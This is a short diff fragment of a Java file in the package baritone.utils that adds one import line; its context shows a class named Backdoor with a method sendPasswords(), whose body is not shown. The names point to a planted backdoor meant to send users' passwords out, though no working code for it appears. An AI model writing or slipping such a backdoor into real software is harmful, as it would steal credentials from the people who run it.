@@ -1,6 +1,7 @@
 package baritone.utils;
 
 import java.io.PrintWriter;
+import java.io.FileNotFoundException;
 
 public class Backdoor {
   public static void sendPasswords() {
